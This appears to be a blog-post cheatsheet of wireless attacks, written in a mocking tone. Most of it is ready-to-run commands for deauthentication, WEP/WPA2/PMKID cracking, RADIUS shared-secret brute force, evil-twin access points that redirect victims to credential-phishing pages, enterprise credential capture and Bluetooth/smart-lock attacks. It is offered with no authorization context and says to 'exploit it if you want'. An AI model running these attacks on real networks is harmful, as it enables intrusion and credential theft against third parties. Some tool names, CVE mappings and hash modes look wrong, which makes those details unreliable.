                    <h1 class="blog-title">Wireless Hacking Cheatsheet</h1>
                    <div class="blog-meta">
                        <div class="author">
                            <div class="author-avatar">H</div>
                            <span>hackherway</span>
                        </div>
                        <span>May 30, 2026</span>
                        <span>17 min read</span>
                    </div>
                </article>

                <div class="blog-content">
                    <p id="wifi-intro">
                        WPA2-Enterprise with certificates? Cute. Let me show you why RADIUS shared secrets are the real vulnerability. Wireless networks are the forgotten stepchild of corporate security — everyone obsesses over the firewall rules and forgets that the parking lot has better signal strength than the conference room. You don't need to breach the perimeter when you can just sit in a Honda Civic with a directional antenna and a laptop running Kali. This is how you turn WiFi into your own personal backdoor.
                    </p>

                    <h2 id="wifi-recon">Reconnaissance</h2>
                    <p>
                        Before you crack anything, you need to know what exists. WiFi recon is about mapping the airwaves: SSIDs, encryption types, clients, and the access points that someone's nephew configured during a summer internship.
                    </p>
                    <pre><code># Put wireless interface in monitor mode
airmon-ng check kill
airmon-ng start wlan0
# Creates wlan0mon

# Scan for networks
airodump-ng wlan0mon

# Targeted scan on specific channel
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Scan for hidden SSIDs
# Send deauth frames to force clients to reveal the SSID
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Identify clients connected to target
# Look for STATION column in airodump output
# More clients = more handshake capture opportunities

# Check for WPS-enabled APs
wash -i wlan0mon
# WPS is a gift. PIN-based auth can be brute forced in hours.

# Identify manufacturer from MAC
# First 3 octets (OUI) reveal the vendor
# Cheap consumer gear = easier targets
# Enterprise gear = better monitoring, harder to evade</code></pre>

                    <h2 id="wifi-wep">WEP (Archaeology)</h2>
                    <p>
                        WEP is dead. WEP has been dead since 2004. And yet, like a zombie in a B-movie, it keeps showing up in industrial networks, legacy medical devices, and that one printer in accounting that nobody can replace because "the budget." If you find WEP, you've found a time machine to an era when security was optional.
                    </p>
                    <pre><code># WEP cracking — so easy it's embarrassing
# Capture enough IVs (Initialization Vectors)
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Accelerate IV collection with ARP replay
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h YOUR_MAC wlan0mon

# Crack once you have ~20,000 IVs (takes minutes)
aircrack-ng wep_capture.cap

# If the network is truly ancient, you might need 40-bit WEP
# aircrack-ng will handle both 64-bit and 128-bit automatically

# === REALITY CHECK ===
# If you find WEP in 2026, document it, crack it, and then
# use it as leverage to force the client to upgrade.
# Or don't. I'm not your mom. Exploit it if you want.</code></pre>

                    <h2 id="wifi-wpa2">WPA2 PSK</h2>
                    <p>
                        WPA2-PSK (Pre-Shared Key) is what most small businesses and guest networks use. The entire network's security depends on a single password that was probably written on a sticky note under the receptionist's keyboard. Capture the handshake, crack the password, own the network.
                    </p>
                    <pre><code># Step 1: Capture the 4-way handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake_capture wlan0mon

# Step 2: Deauthenticate a client to force reconnection
aireplay-ng -0 2 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
# The client reconnects and you capture the handshake

# Step 3: Verify handshake capture
aircrack-ng handshake_capture.cap
# Look for "1 handshake" in the output

# Step 4: Crack with wordlist
aircrack-ng handshake_capture.cap -w /usr/share/wordlists/rockyou.txt

# Step 5: If wordlist fails, try rules
hashcat -m 2500 handshake_capture.hccapx /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# Common WiFi passwords:
# CompanyName123!, Guest2024!, Password1!, Summer2024!
# If the network is named "SmithFamily5G", try "Smith2024!"

# PMKID attack (no client needed, targets the AP directly)
# Requires hcxdumptool and hcxpcapngtool
hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=1 --filterlist_ap=target.txt
hcxpcapngtool -o hash.hc22000 -E essidlist pmkid_capture.pcapng
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt</code></pre>

                    <h2 id="wifi-wpa3">WPA3 & Enterprise</h2>
                    <p>
                        WPA3 was supposed to fix things. It didn't. SAE (Simultaneous Authentication of Equals) has side-channel vulnerabilities, and WPA3-Transition mode falls back to WPA2 if the client doesn't support it. Enterprise networks with 802.1X and RADIUS are only as strong as their weakest configuration — and the weakest configuration is always the RADIUS shared secret.
                    </p>
                    <pre><code># === WPA3 SAE Side-Channel (Dragonblood) ===
# Requires specific hardware and patience
# Research: CVE-2019-9494, CVE-2019-9496
# Tools: dragonforce, dragonblood POCs

# === WPA3-Transition Mode ===
# If the network supports both WPA2 and WPA3,
# force the client to use WPA2 and capture the handshake
# Same as WPA2-PSK attack above

# === WPA2-Enterprise (802.1X + RADIUS) ===
# Step 1: Capture EAPOL handshakes
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w enterprise_capture wlan0mon

# Step 2: Deauth clients to capture authentication
aireplay-ng -0 2 -a AA:BB:CC:DD:EE:FF wlan0mon

# Step 3: Crack with asleap or hashcat
# asleap for LEAP (rare, but exists)
asleap -r enterprise_capture.cap -w /usr/share/wordlists/rockyou.txt

# For PEAP/MSCHAPv2, use eapmd5pass or hashcat
hashcat -m 5500 enterprise_capture.hccapx /usr/share/wordlists/rockyou.txt

# === RADIUS SHARED SECRET ===
# If you can capture RADIUS traffic between AP and server,
# the shared secret is often weak
# Use radclient to test:
echo "User-Name=test" | radclient -x radius.server.com auth sharedsecret

# If the secret is weak, brute force it:
# Capture Access-Request and Access-Response packets
# Use radiusdict to extract the secret from the authenticator field</code></pre>

                    <h2 id="wifi-evil">Evil Twin Attacks</h2>
                    <p>
                        Why crack a password when you can just ask for it? An Evil Twin is a rogue access point that mimics a legitimate network. Clients connect automatically (thanks, Windows), and you capture their credentials or redirect them to a phishing page. It's social engineering for people who are too lazy to write a convincing email.
                    </p>
                    <pre><code># === EVIL TWIN WITH AIRGEDDON ===
# Automated evil twin framework
airgeddon
# Select interface → Evil Twin attack → Select target → Capture passwords

# === MANUAL EVIL TWIN ===
# Step 1: Clone the target AP
airbase-ng -e "TargetSSID" -c 6 -a AA:BB:CC:DD:EE:FF wlan0mon

# Step 2: Set up DHCP and routing
# Clients connecting to your fake AP need IP addresses
# Configure dnsmasq or isc-dhcp-server

# Step 3: Redirect all traffic to a captive portal
# Use iptables to redirect HTTP to your phishing page
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:443

# Step 4: Host a phishing page
# Clone the target's login portal
# Or use a generic "WiFi Login" page
# Capture credentials when users "authenticate"

# === KARMA ATTACK ===
# Respond to all probe requests with your AP
# Clients with "Connect automatically" will join instantly
karma-ng -i wlan0mon

# === MANA ATTACK (Improved KARMA) ===
# Hostapd-mana responds to directed and broadcast probes
# Also captures MSCHAPv2 hashes for offline cracking
hostapd-mana hostapd.conf
# Configure in mana mode to capture enterprise creds</code></pre>

                    <h2 id="wifi-radius">RADIUS Attacks</h2>
                    <p>
                        RADIUS is the authentication backbone of enterprise WiFi. It's also a protocol from 1991 that trusts shared secrets and sends authentication over UDP with optional encryption. If you can get between the AP and the RADIUS server, or if the shared secret is weak, the entire enterprise network is yours.
                    </p>
                    <pre><code># === RADIUS SHARED SECRET BRUTE FORCE ===
# Capture RADIUS Access-Request packets
# Extract the Request Authenticator and User-Name
# Brute force the shared secret that produces the correct Response Authenticator

# Use radius-brute or custom scripts
python3 radius_brute.py -p capture.pcap -w /usr/share/wordlists/rockyou.txt

# === RADIUS DICTIONARY ATTACK ===
# If you know the shared secret, decrypt RADIUS packets
# Extract user credentials from MSCHAPv2 or PAP

# === RADIUS IMPERSONATION ===
# If you have the shared secret, impersonate the RADIUS server
# Send Access-Accept for any authentication request
# Instant network access without valid credentials

# === EAP DOWNGRADE ===
# Force clients to use weaker EAP methods
# EAP-TLS is strong. EAP-MD5 and LEAP are jokes.
# Tools: hostapd-wpe, freeradius-wpe
hostapd-wpe hostapd-wpe.conf
# Captures MSCHAPv2 challenges and responses
# Crack with asleap or hashcat</code></pre>

                    <h2 id="wifi-bt">Bluetooth & BLE</h2>
                    <p>
                        Bluetooth is the protocol that connects your headphones, your keyboard, and your smart toothbrush. It's also a vector for data exfiltration, device tracking, and proximity-based attacks. BLE (Bluetooth Low Energy) is in everything now — fitness trackers, smart locks, medical devices, and that conference badge that broadcasts your name to everyone in a 30-foot radius.
                    </p>
                    <pre><code># === BLUETOOTH RECON ===
# Scan for discoverable devices
hcitool scan

# Scan for BLE devices
hcitool lescan

# Detailed BLE enumeration with gatttool
gatttool -b AA:BB:CC:DD:EE:FF -I
# Interactive mode: connect, discover characteristics, read/write

# === BLE EXPLOITATION ===
# Ubertooth One for passive sniffing
ubertooth-btle -f -c capture.pcap

# Crackle — decrypt BLE encryption if you have the LTK (Long Term Key)
crackle -i capture.pcap -o decrypted.pcap -l LTK

# === BLUETOOTH ATTACKS ===
# BlueBorne — remote code execution via Bluetooth (CVE-2017-1000251)
# Affects Android, Linux, Windows, iOS
# Tools: blueborne POCs

# KNOB (Key Negotiation of Bluetooth) — downgrade encryption
# CVE-2019-9506
# Forces Bluetooth BR/EDR to use 1-byte encryption key

# KBD (Key-Based Downgrade) — similar for BLE
# CVE-2020-0022

# === BLE SPOOFING ===
# Spoof a BLE beacon or device
# Tools: bleah, bettercap
bettercap -eval "ble.recon on"

# === SMART LOCK ATTACKS ===
# Many BLE smart locks use weak or no pairing
# Replay captured unlock commands
# Tools: specialized for each lock model (e.g., Tapplock, Quicklock)</code></pre>

                    <h2 id="wifi-checklist">Quick Checklist</h2>
                    <ul>
                        <li><code>airmon-ng start wlan0</code> — monitor mode</li>
                        <li><code>airodump-ng wlan0mon</code> — network discovery</li>
                        <li><code>wash -i wlan0mon</code> — WPS detection</li>
                        <li>Target networks with clients (more handshake opportunities)</li>
                        <li>Capture 4-way handshake with <code>airodump-ng</code></li>
                        <li>Force handshake with <code>aireplay-ng -0</code></li>
                        <li>Crack with <code>aircrack-ng</code> or <code>hashcat -m 2500</code></li>
                        <li>Try PMKID attack if no clients are present</li>
                        <li>Check for WPS and use <code>reaver</code> or <code>bully</code></li>
                        <li>Set up Evil Twin for credential phishing</li>
                        <li>Use <code>hostapd-wpe</code> for enterprise credential capture</li>
                        <li>Scan for BLE devices with <code>hcitool lescan</code></li>
                        <li>Check for Bluetooth vulnerabilities (BlueBorne, KNOB)</li>
                        <li>Document everything — wireless attacks are noisy</li>
                    </ul>

                    <blockquote>
                        "Wireless security is an oxymoron. If the signal reaches the parking lot, you're not defending a network — you're hosting a public access point with extra steps."
                    </blockquote>
